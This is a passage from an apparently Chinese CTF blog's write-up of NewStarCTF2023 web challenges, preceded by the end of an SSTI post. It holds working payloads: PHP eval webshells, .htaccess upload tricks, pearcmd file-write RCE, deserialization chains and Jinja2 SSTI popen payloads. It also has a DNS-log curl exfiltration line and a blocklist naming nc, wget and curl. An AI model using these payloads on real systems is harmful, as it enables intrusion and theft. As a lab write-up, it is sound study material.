__base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__　　：以列表返回类的子类</span><br><span class="line">__init__　　 ：类的初始化方法</span><br><span class="line">__globals__　　   ：对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">B</span>):<span class="keyword">pass</span></span><br><span class="line">c = D()</span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__) <span class="comment"># 返回D类上一个父类（B类）</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__) <span class="comment"># 返回D类的所有父类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">2</span>]) <span class="comment"># 返回A类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">2</span>].__subclasses__()) <span class="comment"># 返回A类的子类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__subclasses__()) <span class="comment"># 返回B类的子类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__subclasses__()[<span class="number">1</span>]) <span class="comment"># 返回D类</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;class &#x27;__main__.B&#x27;&gt;</span><br><span class="line">(&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&lt;class &#x27;__main__.A&#x27;&gt;</span><br><span class="line">[&lt;class &#x27;__main__.B&#x27;&gt;]</span><br><span class="line">[&lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.D&#x27;&gt;]</span><br><span class="line">&lt;class &#x27;__main__.D&#x27;&gt;</span><br></pre></td></tr></table></figure><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><p><a href="https://www.cnblogs.com/2ha0yuk7on/p/16648850.html#payload%E8%A7%A3%E6%9E%90">绕过姿势</a></p><p>以后再写吧，看大佬的吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023-web</title>
      <link href="/post/3ce9d3bc.html"/>
      <url>/post/3ce9d3bc.html</url>
      
        <content type="html"><![CDATA[<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>题目</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019124225948.png" alt="image-20231019124225948"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?number1=1&amp;number2=2</span><br></pre></td></tr></table></figure><p>提示回显</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019124424685.png" alt="image-20231019124424685"></p><p>用<code>&#123;&#123;&#125;&#125;</code>包裹参数进行传参，回显了一个错误界面，flag也出来了</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019124641860.png" alt="image-20231019124641860"></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。key3[]=1</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strcmp()函数用于比较两个字符串并根据比较结果返回整数。基本形式为strcmp(str1,str2)，若str1=str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数。</span><br></pre></td></tr></table></figure><p>这个strcmp()函数传入数组的话，直接会返回一个0。<code>key4[]=1</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需要将true赋值给flag5，但是不能有大小写字母和数字，我们可以进行取反</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">// flag5=(~%8B%8D%8A%9A)()</span></span><br></pre></td></tr></table></figure><p>preg_match() 不接受数组作为参数，只接受字符串。</p><p>还可以数组进行绕过，<code>flag5[]=true</code></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password的MD5值的前六位是c4d038</span><br><span class="line">e_v.a.l的值不能是flag那些字符</span><br></pre></td></tr></table></figure><p>发现<code>114514</code>的MD5值的前六位是c4d038，所以password&#x3D;114514</p><p>在post传参时，变量名里的点和空格是非法字符，会被转化为<code>_</code></p><p>这里有一个漏洞，如果变量有<code>[</code>，它会被转换成<code>_</code>,但中括号后面的非法字符就不会被转变</p><p>我们传的变量名是<code>e[v.a.l</code></p><p>payload：<code>password=114514&amp;e[v.a.l=eval($_POST[1]);&amp;1=system(&#39;cat /flag&#39;);</code></p><p>其他姿势：<code>password=114514&amp;e[v.a.l=echo </code>nl &#x2F;f* <code>;</code></p><p>搜集了一些与cat命令差不多的命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">strings:可以查看</span><br><span class="line">rev:反过来看</span><br></pre></td></tr></table></figure><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>就是一个弱口令爆破，它的密码会进行md5加密</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019173854276.png" alt="image-20231019173854276"></p><p>在爆破的时候，设置一下</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019174042511.png" alt="image-20231019174042511"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019174238726.png" alt="image-20231019174238726"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019174527979.png" alt="image-20231019174527979"></p><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件包含漏洞，过滤了base和rot，换一个过滤器就可以</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.utf-8.utf-16/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>题目</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019180414346.png" alt="image-20231019180414346"></p><p>说是泄露了信息，用githack进行恢复</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019180656607.png" alt="image-20231019180656607"></p><p>有一个<code>bo0g1pop.php</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;</span><br><span class="line">    if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123;</span><br><span class="line">        eval($_GET[&#x27;star&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019181017538.png" alt="image-20231019181017538"></p><p>如果传进去的值是传进去的值是字符串接一个<code>()</code>，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下<code>;</code>，代码就会被执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">getallheaders</span>() <span class="comment">//取出所有http请求头信息，返回一个数组</span></span><br><span class="line"><span class="title function_ invoke__">array_flip</span>() <span class="comment">//函数用于反转/交换数组中所有的键名以及它们关联的键值</span></span><br><span class="line"><span class="title function_ invoke__">array_rand</span>() <span class="comment">//函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组</span></span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019183349732.png" alt="image-20231019183349732"></p><h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p>上传图片一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现被过滤了</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">GIF89</span>a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上传<code>.htaccess</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;3.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php <span class="comment">//所有上传文件解析为php类型</span></span><br></pre></td></tr></table></figure><p>上传成功后就可以进行传参</p><h3 id="SWPUCTF-2023-秋季新生赛-RCE-PLUS"><a href="#SWPUCTF-2023-秋季新生赛-RCE-PLUS" class="headerlink" title="[SWPUCTF 2023 秋季新生赛]RCE-PLUS"></a>[SWPUCTF 2023 秋季新生赛]RCE-PLUS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);      </span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//无回显的函数，需要echo进行输出</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="comment">//有回显的函数</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br></pre></td></tr></table></figure><p>姿势一：</p><p>直接利用<code>&gt;</code>直接输出结果到文件</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /&gt;1</span><br><span class="line">cat /fl*&gt;1</span><br></pre></td></tr></table></figure><p>姿势二：</p><p>利用带外出flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line">curl ``.域名</span><br><span class="line">payload:</span><br><span class="line">curl `cat /fl*`.k8cg5h.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231023224311602.png" alt="image-20231023224311602"></p><h3 id="SWPUCTF-2023-秋季新生赛-If-else"><a href="#SWPUCTF-2023-秋季新生赛-If-else" class="headerlink" title="[SWPUCTF 2023 秋季新生赛]If_else"></a>[SWPUCTF 2023 秋季新生赛]If_else</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(你提交的部分将会被写至这里)</span><br><span class="line">    &#123;<span class="variable">$a</span>=<span class="literal">true</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="variable">$b</span>=<span class="literal">true</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>===<span class="literal">true</span>&amp;&amp;<span class="variable">$b</span>===<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(cat /flag));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check=1==1) &#123;system(&#x27;cat /fl*&#x27;);&#125; /*</span><br></pre></td></tr></table></figure><p>直接执行代码，用&#x2F;*将后面代码进行注释</p><h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><h3 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提示看<code>phpinfo.php</code></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024215224955.png" alt="image-20231024215224955"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024215239939.png" alt="image-20231024215239939"></p><p>发现register_argc_argv是开启状态，搜索得到是要利用pearcmd命令执行</p><p><a href="https://www.cnblogs.com/Yu--/p/15788689.html">具体点这里</a></p><p>payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd&amp;+config-create+/<span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])<span class="meta">?&gt;</span>+/tmp/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p>各个参数用<code>+</code>分开，并传参</p><p>这里要用burp及进行传参，用hackbar<code>&gt;</code>这些字符会被url编码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024220315095.png" alt="image-20231024220315095"></p><p>上传成功后，我们访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/tmp/1  //题目后面是带着.php的</span><br></pre></td></tr></table></figure><p>然后进行rce就行了</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024221039650.png" alt="image-20231024221039650"></p><h3 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个反序列化直接进行触发tostring就可以</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;cat /flag_is_h3eeere |script 1&quot;</span>;  <span class="comment">//cat /flag_is_h3eeere | t&#x27;&#x27;ee b</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>命令：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls / | t<span class="string">&#x27;&#x27;</span>ee b</span><br><span class="line">cat /flag_is_h3eeere | t<span class="string">&#x27;&#x27;</span>ee b</span><br><span class="line">cat /flag_is_h3eeere |script <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。</span><br><span class="line">tee file1 file2 //复制文件</span><br><span class="line">ls /|tee 1.txt //命令输出</span><br></pre></td></tr></table></figure><p>用这个<code>cat /flag_is_h3eeere |script 1</code>将文件内容写进<code>1</code>文件，访问1就可以</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024222024890.png" alt="image-20231024222024890"></p><h3 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h3><p>这里GET传参，传什么返回什么，应该是ssti模板注入</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031220913440.png" alt="image-20231031220913440"></p><p>用<code>&#123;&#123;&#125;&#125;</code>发现被过滤了,这里还可以用<code>&#123;% %&#125;</code>也可以执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看一下子类</span><br><span class="line">&#123;%print(&quot;&quot;.__class__.__mro__[1].__subclasses__())%&#125;</span><br><span class="line">找一下能用的模板&lt;class &#x27;os._wrap_close&#x27;&gt;</span><br><span class="line">然后找它的位置，是132</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031222536385.png" alt="image-20231031222536385"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">接着用__init__重载函数，发现被过滤了可以用[&quot;__in&quot;+&quot;it__&quot;]，这里发现单引号也被过滤了，用双引号，中括号，大括号</span><br><span class="line">然后再用__goblas__,这里用popen执行命令，这里popen也是被过滤掉了用+进行拼接绕过[&quot;po&quot;+&quot;pen&quot;]</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031223425625.png" alt="image-20231031223425625"></p><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print(&#123;&#125;.__class__.__mro__[1].__subclasses__()[132][&quot;__in&quot;+&quot;it__&quot;][&quot;__globals__&quot;][&quot;po&quot;+&quot;pen&quot;](&quot;cat /flag&quot;).read())%&#125;</span><br></pre></td></tr></table></figure><p>官方payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% print(get_flashed_messages.__globals__.os[&quot;pop&quot;+&quot;en&quot;](&quot;cat /flag&quot;).read()) %&#125;</span><br><span class="line">get_flashed_messages这个内置函数没有被过滤</span><br></pre></td></tr></table></figure><h2 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h2><h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span 